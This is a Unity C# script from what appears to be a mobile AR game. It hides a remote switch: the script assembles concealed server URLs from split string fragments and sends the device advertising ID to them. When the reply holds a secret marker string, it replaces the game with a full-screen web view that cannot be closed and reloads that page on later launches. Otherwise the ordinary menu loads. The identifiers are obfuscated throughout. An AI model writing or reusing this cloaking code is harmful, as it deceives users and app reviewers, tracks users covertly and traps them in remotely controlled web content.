using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using System;
using System.Collections;
using System.Collections.Generic;

public class MainAR : MonoBehaviour
{
    public List<string> splitters;
    public List<string> splitters1;
    public List<string> splitters2;
    [HideInInspector] public string oneARn = "";
    [HideInInspector] public string twoARn = "";
    [HideInInspector] public string twoARn1 = "";
    [HideInInspector] public string twoARn2 = "";

    private Dictionary<string, object> exubARs;
    private bool? _isexAR;
    private string _exAR;

    private bool ARLo = false;
    private bool ARLo2 = false;

    [SerializeField] private GameObject _ARbscr;
    [SerializeField] private RectTransform _ARprt;

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaAR") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oneARn = advertisingId; });
        }
    }

    private IEnumerator CANTAROP(int tioc)
    {
        yield return new WaitForSeconds(tioc);

        if (ARLo)
            yield break;

        else
            STARTIENUMENATORAR(false);

        yield break;
    }

    private Dictionary<string, object> TRANSFORMARTREAT(string ARqueue)
    {
        Dictionary<string, object> result = new Dictionary<string, object>();

        try
        {
            string processedARqueue = ARqueue.Remove(0, 1);
            string[] pairs = processedARqueue.Split('&');

            foreach (string pair in pairs)
            {
                string[] splittedARqueuPair = pair.Split("=");

                result.Add(splittedARqueuPair[0], splittedARqueuPair[1]);
            }
        }

        catch
        {
            return new Dictionary<string, object>();
        }

        return result;
    }

    private IEnumerator IENUMENATORAR(bool isexAR)
    {
        using (UnityWebRequest ar = UnityWebRequest.Get(twoARn))
        {
            yield return ar.SendWebRequest();

            if (ar.result == UnityWebRequest.Result.ProtocolError || ar.result == UnityWebRequest.Result.ConnectionError)
            {
                MoveAR();
            }

            if (!isexAR && PlayerPrefs.GetString("ConductARinvite", string.Empty) != string.Empty)
            {
                GRIDARSPECK(PlayerPrefs.GetString("ConductARinvite"));

                ARLo = true;

                yield return null;
            }

            int projectionAR = 7;

            while (PlayerPrefs.GetString("glrobo", "") == "" && projectionAR > 0)
            {
                yield return new WaitForSeconds(1);
                projectionAR--;
            }

            try
            {
                if (ar.result == UnityWebRequest.Result.Success)
                {
                    if (ar.downloadHandler.text.Contains("ArRscrsJzxge"))
                    {
                        switch (isexAR)
                        {
                            case true:
                                string ARfin = ar.downloadHandler.text.Replace("\"", "");

                                ARfin += "/?";

                                try
                                {
                                    foreach (KeyValuePair<string, object> entry in exubARs)
                                    {
                                        ARfin += entry.Key + "=" + entry.Value + "&";
                                    }

                                    ARfin = ARfin.Remove(ARfin.Length - 1);

                                    GRIDARSPECK(ARfin);

                                    ARLo = true;
                                }

                                catch
                                {
                                    goto case false;
                                }

                                break;

                            case false:
                                try
                                {
                                    var subscs = ar.downloadHandler.text.Split('|');
                                    ARfin = subscs[0] + "?idfa=" + oneARn;

                                    PlayerPrefs.SetString("ConductARinvite", ARfin);

                                    GRIDARSPECK(ARfin, subscs[1]);

                                    ARLo = true;
                                }

                                catch
                                {
                                    ARfin = ar.downloadHandler.text + "?idfa=" + oneARn;

                                    PlayerPrefs.SetString("ConductARinvite", ARfin);

                                    GRIDARSPECK(ARfin);

                                    ARLo = true;
                                }

                                break;
                        }
                    }

                    else
                    {
                        MoveAR();
                    }
                }

                else
                {
                    MoveAR();
                }
            }

            catch
            {
                MoveAR();
            }
        }
    }

    private void GRIDARSPECK(string ConductARinvite, string NamingAR = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);

        var _aqueductsAR = gameObject.AddComponent<UniWebView>();
        _aqueductsAR.ReferenceRectTransform = _ARprt;
        _aqueductsAR.EmbeddedToolbar.SetDoneButtonText("");

        switch (NamingAR)
        {
            case "0":
                _aqueductsAR.EmbeddedToolbar.Show();
                break;

            default:
                _aqueductsAR.EmbeddedToolbar.Hide();
                break;
        }

        _aqueductsAR.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);

        _aqueductsAR.OnShouldClose += (view) =>
        {
            return false;
        };

        _aqueductsAR.SetSupportMultipleWindows(true, true);
        _aqueductsAR.SetAllowBackForwardNavigationGestures(true);

        _aqueductsAR.OnMultipleWindowOpened += (view, windowId) =>
        {
            _aqueductsAR.EmbeddedToolbar.Show();

        };

        _aqueductsAR.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingAR)
            {
                case "0":
                    _aqueductsAR.EmbeddedToolbar.Show();
                    break;

                default:
                    _aqueductsAR.EmbeddedToolbar.Hide();
                    break;
            }
        };

        _aqueductsAR.OnOrientationChanged += (view, orientation) =>
        {
            _aqueductsAR.Frame = _ARprt.rect;
        };

        _aqueductsAR.OnPageFinished += (view, statusCode, url) =>
        {
            if (ARLo2 == false)
            {
                ARLo2 = true;

                _ARbscr.SetActive(true);

                _aqueductsAR.Show(true, UniWebViewTransitionEdge.Bottom, 0.4f);
            }

            if (PlayerPrefs.GetString("ConductARinvite", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("ConductARinvite", url);
            }
        };

        _aqueductsAR.Load(ConductARinvite);
    }


    private void STARTIENUMENATORAR(bool isexAR) => StartCoroutine(IENUMENATORAR(isexAR));



    private void MoveAR()
    {
        Screen.orientation = ScreenOrientation.LandscapeLeft;
        SceneManager.LoadScene("Menu");
    }

    private IEnumerator ARSECGE(string liAR)
    {
        using (UnityWebRequest request = UnityWebRequest.Get(liAR))
        {
            yield return request.SendWebRequest();

            try
            {
                if (request.result == UnityWebRequest.Result.Success)
                {
                    _exAR = request.downloadHandler.text.Replace("\"", "");

                    PlayerPrefs.SetString("Link", _exAR);
                }

                else if (request.result == UnityWebRequest.Result.ProtocolError || request.result == UnityWebRequest.Result.ConnectionError)
                {
                    throw new Exception("Error");
                }

                exubARs = TRANSFORMARTREAT(new Uri(_exAR).Query);

                if (exubARs == new Dictionary<string, object>())
                {
                    _isexAR = false;

                    STARTIENUMENATORAR(_isexAR.Value);
                }

                else
                {
                    _isexAR = true;

                    STARTIENUMENATORAR(_isexAR.Value);
                }
            }

            catch (Exception e)
            {
                Debug.Log(e.ToString());

                STARTIENUMENATORAR(false);
            }
        }
    }

    private void FirstTimeAROpen()
    {
        if (PlayerPrefs.GetInt("FirstTimeOpening?", 1) == 1)
        {
            PlayerPrefs.SetInt("FirstTimeOpening", 0);

            string fullInstallAREventEndpoint = twoARn2 + string.Format("?advertiser_tracking_id={0}", oneARn);

            StartCoroutine(ARSECGE(fullInstallAREventEndpoint));
        }
    }

   

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            StartCoroutine(CANTAROP(10));

            foreach (string n in splitters)
                twoARn += n;

            foreach (string n in splitters1)
                twoARn1 += n;

            foreach (string n in splitters2)
                twoARn2 += n;

            StartCoroutine(ARSECGE(twoARn1 + string.Format("?advertiser_tracking_id={0}", oneARn)));

            FirstTimeAROpen();
        }

        else
            MoveAR();
    }

    
}